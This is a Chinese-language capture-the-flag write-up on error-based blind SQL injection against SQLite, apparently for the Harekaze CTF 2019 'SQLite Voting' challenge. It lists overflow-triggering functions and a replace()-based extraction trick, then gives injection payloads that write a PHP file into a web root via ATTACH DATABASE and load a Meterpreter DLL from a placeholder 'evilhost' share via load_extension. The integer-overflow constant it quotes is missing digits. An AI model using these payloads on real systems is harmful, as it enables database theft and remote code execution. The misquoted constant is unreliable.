### 基于错误的 SQLite 盲注

从目前的情况来看，我们可以基本确定这是一个盲注攻击（通过前面提到的 `banword` 也可以推测）。接下来，我们需要故意制造错误来确认盲注是否成功。

#### 可供制造错误的函数

参考 [SQLite 官方手册的内置函数](https://www.sqlite.org/lang_corefunc.html)，我们找到了以下几个可以故意制造错误的函数：

1. **`load_extension(x)` 和 `load_extension(x, y)`**:
   - `load_extension(x, y)` 函数使用入口点 `y` 从名为 `x` 的共享库文件中加载 SQLite 扩展。如果省略 `y`，则使用默认的入口点名称。
   - 如果扩展未能正确加载或初始化，则 `load_extension()` 函数会引发异常。
   - 这个函数可以加载动态库，如 Windows 的 `.dll` 或 Linux 的 `.so`，从而实现远程命令执行。具体可以参考这篇 [利用该函数反弹 shell 的博客](https://blog.csdn.net/qq_34101364/article/details/109250435)。

2. **`abs(x)`**:
   - 返回数值参数 `x` 的绝对值。如果 `x` 为 `NULL`，则 `abs(x)` 返回 `NULL`。
   - 如果 `x` 是不能转换为数值的字符串或 blob，则 `abs(x)` 返回 `0.0`。
   - 如果 `x` 是整数 `-922337203685475808`，那么 `abs(x)` 会抛出一个整数溢出错误。
   - `0x8000000000000000` 是 `-922337203685475808` 的十六进制形式。

3. **`sum(x)`**:
   - 返回一组中所有非空值的数值总和。
   - 如果所有输入都是整数或者 `NULL`，并且结果溢出时，`sum(x)` 将抛出一个“整数溢出”异常。

4. **`ntile(n)`**:
   - 参数 `n` 被作为整数处理。这个函数将分区尽可能平均地划分为 `n` 组，并按 `ORDER BY` 子句定义的顺序或其他任意顺序将 `1` 到 `n` 之间的整数分配给每个组。
   - 如果有必要，会首先出现更大的组。此函数返回分配给当前行所属组的整数值。
   - 同样也会触发整数溢出异常。

在这些函数中，最常用的是整数溢出的方法。

#### 利用长度变化的盲注

传统的盲注方法是使用 `substr` 和 `ord` 配合进行判断，但在这里显然受到了限制。此外，字符（引号被过滤）和 ASCII 码判断（`char` 被过滤）也不能使用。那么，如何判断每一位是否正确呢？

出题人 [st98 师傅](https://st98.github.io/diary/posts/2019-05-21-harekaze-ctf-2019.html#web-350-sqlite-voting) 提到了一种利用 `replace` 函数来判断的方法：

- **`replace(x, y, z)`**:
  - `replace(x, y, z)` 函数返回一个字符串，这个字符串是用字符串 `z` 替换字符串 `x` 中每个字符串 `y` 而形成的。
  - 例如，假设 `flag` 为 `flag{landv01}`，长度为 13。如果我们将 `flag` 中的 `flag` 替换为空字符串，长度变为 9。
  - 因此，我们可以利用长度的变化来判断是否正确。

我还发现了一个类似的函数 `trim(x, y)`，但它并不适合用于盲注，因为它的行为是删除 `x` 两端出现在 `y` 中的任何和所有字符。例如，如果 `y` 是 `flag{`，那么 `fla` 和 `la` 这样的组合都会被删掉，无法用于判断。

然而，在 Oracle 数据库中，`trim(leading 'f' from flag)` 可以用于判断前导字符。例如：
```sql
length(trim(leading 'f' from flag))
```
上述语句可在 Oracle 中用于判断。

#### 特殊字符的绕过

由于存在许多限制，我们可以使用 `hex` 编码来进行绕过。由于一些比较运算符被禁用，我们可以使用位运算符代替。以下脚本来自出题人的博客：

1. **判断 `flag` 长度**:
   ```sql
   abs(case(length(hex((select(flag)from(flag))))&{1
   ```

2. **获得数据**:
   ```sql
   hex('some_char')
   ```

3. **文件写入**:
   ```sql
   1';ATTACH DATABASE '/var/www/lol.php' AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn (dataz) VALUES ('');--
   ```
   需要堆叠查询对应的配置开启。

4. **代码执行**:
   ```sql
   UNION SELECT 1, load_extension('\evilhost\evilshare\meterpreter.dll', 'DllMain');--
   ```
   具体使用可以参考上面介绍给出的链接，默认情况下这个函数是禁用的。

### 参考资料
- [SQLite 官方手册的内置函数](https://www.sqlite.org/lang_corefunc.html)
- [利用 `load_extension` 函数反弹 shell 的博客](https://blog.csdn.net/qq_34101364/article/details/109250435)
- [st98 师傅的博客](https://st98.github.io/diary/posts/2019-05-21-harekaze-ctf-2019.html#web-350-sqlite-voting)
- [Oracle 文档中的 `TRIM` 函数](https://docs.oracle.com/en/database/oracle/oracle-database/20/sqlrf/TRIM.html#GUID-00D5C77C-19B1-4894-828F-066746235B03)

希望这些信息对你有所帮助！